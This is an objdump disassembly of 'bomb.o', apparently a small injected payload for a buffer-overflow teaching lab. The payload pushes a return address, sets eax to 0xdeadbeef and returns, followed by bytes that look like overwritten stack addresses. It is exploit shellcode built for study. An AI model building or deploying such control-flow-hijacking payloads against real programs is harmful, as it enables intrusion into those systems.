
bomb.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	68 1f 86 04 08       	push   $0x804861f
   5:	b8 ef be ad de       	mov    $0xdeadbeef,%eax
   a:	c3                   	ret    
   b:	90                   	nop
   c:	00 e3                	add    %ah,%bl
   e:	e0 f8                	loopne 0x8
  10:	01 00                	add    %eax,(%eax)
  12:	00 00                	add    %al,(%eax)
  14:	02 00                	add    (%eax),%al
  16:	00 00                	add    %al,(%eax)
  18:	d8 ef                	fsubr  %st(7),%st
  1a:	ff                   	(bad)  
  1b:	bf a0 ef ff bf       	mov    $0xbfffefa0,%edi
